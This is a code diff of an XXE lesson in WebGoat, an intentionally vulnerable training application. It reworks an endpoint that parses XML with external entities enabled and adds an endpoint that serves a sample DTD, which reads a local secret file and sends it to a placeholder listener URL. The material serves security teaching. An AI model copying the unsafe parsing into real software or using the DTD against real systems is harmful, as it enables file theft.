@@ -20,66 +20,63 @@
  * Source for this application is maintained at https://github.com/WebGoat/WebGoat, a repository for free software projects.
  */
 
-package org.owasp.webgoat.xxe;
+package org.owasp.webgoat.lessons.xxe;
 
 import org.apache.commons.exec.OS;
 import org.apache.commons.lang3.exception.ExceptionUtils;
 import org.owasp.webgoat.container.assignments.AssignmentEndpoint;
 import org.owasp.webgoat.container.assignments.AssignmentHints;
 import org.owasp.webgoat.container.assignments.AttackResult;
-import org.owasp.webgoat.container.session.WebSession;
 import org.springframework.beans.factory.annotation.Autowired;
 import org.springframework.beans.factory.annotation.Value;
 import org.springframework.http.MediaType;
 import org.springframework.web.bind.annotation.PostMapping;
 import org.springframework.web.bind.annotation.RequestBody;
-import org.springframework.web.bind.annotation.RequestHeader;
+import org.springframework.web.bind.annotation.RequestMapping;
 import org.springframework.web.bind.annotation.ResponseBody;
 import org.springframework.web.bind.annotation.RestController;
 
 import javax.servlet.http.HttpServletRequest;
 
+import static org.springframework.http.MediaType.ALL_VALUE;
 import static org.springframework.http.MediaType.APPLICATION_JSON_VALUE;
 
+
+/**
+ * @author nbaars
+ * @since 4/8/17.
+ */
 @RestController
-@AssignmentHints({"xxe.hints.content.type.xxe.1", "xxe.hints.content.type.xxe.2"})
-public class ContentTypeAssignment extends AssignmentEndpoint {
+@AssignmentHints({"xxe.hints.simple.xxe.1", "xxe.hints.simple.xxe.2", "xxe.hints.simple.xxe.3", "xxe.hints.simple.xxe.4", "xxe.hints.simple.xxe.5", "xxe.hints.simple.xxe.6"})
+public class SimpleXXE extends AssignmentEndpoint {
 
     private static final String[] DEFAULT_LINUX_DIRECTORIES = {"usr", "etc", "var"};
     private static final String[] DEFAULT_WINDOWS_DIRECTORIES = {"Windows", "Program Files (x86)", "Program Files", "pagefile.sys"};
 
     @Value("${webgoat.server.directory}")
     private String webGoatHomeDirectory;
-    @Autowired
-    private WebSession webSession;
+
+    @Value("${webwolf.landingpage.url}")
+    private String webWolfURL;
+
+
     @Autowired
     private Comments comments;
 
-    @PostMapping(path = "xxe/content-type")
+    @PostMapping(path = "xxe/simple", consumes = ALL_VALUE, produces = APPLICATION_JSON_VALUE)
     @ResponseBody
-    public AttackResult createNewUser(HttpServletRequest request, @RequestBody String commentStr, @RequestHeader("Content-Type") String contentType) throws Exception {
-        AttackResult attackResult = failed(this).build();
-
-        if (APPLICATION_JSON_VALUE.equals(contentType)) {
-            comments.parseJson(commentStr).ifPresent(c -> comments.addComment(c, true));
-            attackResult = failed(this).feedback("xxe.content.type.feedback.json").build();
-        }
-
-        if (null != contentType && contentType.contains(MediaType.APPLICATION_XML_VALUE)) {
-            String error = "";
-            try {
-                Comment comment = comments.parseXml(commentStr);
-                comments.addComment(comment, false);
-                if (checkSolution(comment)) {
-                    attackResult = success(this).build();
-                }
-            } catch (Exception e) {
-                error = ExceptionUtils.getStackTrace(e);
-                attackResult = failed(this).feedback("xxe.content.type.feedback.xml").output(error).build();
+    public AttackResult createNewComment(HttpServletRequest request, @RequestBody String commentStr) {
+        String error = "";
+        try {
+            var comment = comments.parseXml(commentStr);
+            comments.addComment(comment, false);
+            if (checkSolution(comment)) {
+                return success(this).build();
             }
+        } catch (Exception e) {
+            error = ExceptionUtils.getStackTrace(e);
         }
-
-        return attackResult;
+        return failed(this).output(error).build();
     }
 
     private boolean checkSolution(Comment comment) {
@@ -89,6 +86,17 @@ public class ContentTypeAssignment extends AssignmentEndpoint {
             success |= org.apache.commons.lang3.StringUtils.contains(comment.getText(), directory);
         }
         return success;
+    }
+
+    @RequestMapping(path = "/xxe/sampledtd", consumes = ALL_VALUE, produces = MediaType.TEXT_PLAIN_VALUE)
+    @ResponseBody
+    public String getSampleDTDFile() {
+        return """
+                <?xml version="1.0" encoding="UTF-8"?>
+                <!ENTITY % file SYSTEM "file:replace-this-by-webgoat-temp-directory/XXE/secret.txt">
+                <!ENTITY % all "<!ENTITY send SYSTEM 'http://replace-this-by-webwolf-base-url/landing?text=%file;'>">
+                %all;
+                """;
     }
 
 }
